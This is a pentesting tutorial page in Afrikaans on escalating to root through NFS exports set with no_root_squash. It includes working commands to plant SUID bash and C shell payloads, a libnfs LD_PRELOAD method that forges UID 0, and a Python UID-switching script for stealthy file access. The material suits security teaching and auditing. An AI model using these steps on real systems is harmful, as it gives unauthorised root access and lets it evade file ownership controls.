# NFS No Root Squash Misconfiguration Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Basiese inligting oor Squashing

Met NFS AUTH_SYS/AUTH_UNIX baseer die server lêertoestemmingkontroles op die `uid` en `gid` wat in elke RPC-versoek verskaf word. Ander security flavors, soos Kerberos, gebruik verskillende credentials, en die server kan numeriese credentials map voordat toestemmings nagegaan word.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Map elke UID en GID na die anonymous account, wat op Linux standaard `nobody` (65534) is. `no_all_squash` is die standaard vir nie-root-versoeke.<sup>[[4]](#references)</sup>
- **`root_squash`**: Dit is die standaard op Linux en map versoeke met UID/GID 0 (root) na die anonymous account; ander UIDs en GIDs word nie gesquash nie.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Deaktiveer root squashing, sodat versoeke met UID/GID 0 as root op die server geëvalueer kan word.<sup>[[4]](#references)</sup>

As ’n toegelate client ’n skryfbare export in **`/etc/exports`** kan mount wat met **`no_root_squash`** gekonfigureer is, kan sy UID/GID 0-versoeke daar skryf as die server se root-gebruiker.<sup>[[4]](#references)</sup>

Vir meer inligting oor **NFS**, kyk na:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Remote Exploit

Opsie 1 met bash:
- Op ’n toegelate client, mount ’n skryfbare export as root, kopieer **`/bin/bash`** daarheen, stel sy **SUID**-bit, en voer dit uit vanaf ’n victim mount wat nie `nosuid` gebruik nie.<sup>[[2]](#references)[[4]](#references)</sup>
- Vir die opgelaaide lêer om deur root besit te bly, moet die server **`no_root_squash`** gebruik. As root gesquash word, is ’n SUID-binêre vir ’n ander account slegs moontlik wanneer die client dit wettiglik met daardie account se numeriese UID/GID kan skep of besit.<sup>[[4]](#references)</sup>
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Opsie 2 met behulp van gecompileerde C-kode:
- Mount die directory vanaf ’n toegelate kliënt, kopieer ’n gecompileerde payload in wat SUID-permissies misbruik, stel sy **SUID**-bit, en voer dit vanaf die slagoffer uit (sien sommige [C SUID-payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
- Dieselfde beperkings as voorheen
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Plaaslike Exploit

> [!TIP]
> Let daarop dat indien jy ’n **tunnel vanaf jou masjien na die slagoffermasjien kan skep, jy steeds die Remote-weergawe kan gebruik om hierdie privilege escalation uit te buit deur die vereiste ports te tunnel**.\
> Die volgende truuk is nuttig wanneer `/etc/exports` die export tot die slagoffer se IP beperk: die remote client kan dit nie mount nie, maar die plaaslike tegniek kan deur die share werk wat reeds op die toegelate host gemount is.<sup>[[2]](#references)</sup>\
> Vir hierdie unprivileged libnfs-metode moet die export in **`/etc/exports`** die `insecure` flag gebruik sodat die proses ’n non-reserved source port kan gebruik; `secure` is die verstek, hoewel ’n proses wat ’n reserved port kan bind, nie hierdie opsie nodig het nie.<sup>[[1]](#references)[[4]](#references)</sup>

### Basiese Inligting

’n NFSv3 AUTH_UNIX-client sluit sy effective UID, GID en groepe by elke call in, en die server gebruik dit vir permission checks. Hierdie plaaslike tegniek misbruik daardie model deur die RPC credentials deur [libnfs](https://github.com/sahlberg/libnfs) te forge; sy preload module ondersteun die overriding van die UID/GID in die NFS-context.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Kompilering van die Library

Die libnfs-example kan adjustments vir die target-kernel vereis; die walkthrough wat hier gebruik word, meld spesifiek dat die fallocate syscalls uitgecomment moet word voordat die preload module gekompileer word.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Uitvoer van die Exploit

Die voorbeeld skep ’n klein C-helper wat ’n shell begin, dit daarna op die share plaas en `ld_nfs.so` met UID 0 in die NFS-konteks gebruik om dit SUID-root te maak.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Kompileer die exploit-kode:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Plaas die exploit op die share en verander sy permissions deur die UID te vervals**.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Voer die exploit uit om root privileges te verkry**.<sup>[[2]](#references)</sup>
```bash
/mnt/share/a.out
#root
```
### Bonus: NFShell vir Stealthy File Access

Sodra root access verkry is, stel hierdie `nfsh.py`-patroon die effektiewe UID op die teikenlêer se UID voordat dit ’n command uitvoer, wat access moontlik maak sonder om eienaarskap rekursief te verander.<sup>[[2]](#references)</sup>
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Voer uit soos:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] ['n Verhaal van 'n minder bekende NFS-privesc](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: NFS Weergawe 3-protokolspesifikasie](https://datatracker.ietf.org/doc/html/rfc1813)
{{#include ../../banners/hacktricks-training.md}}
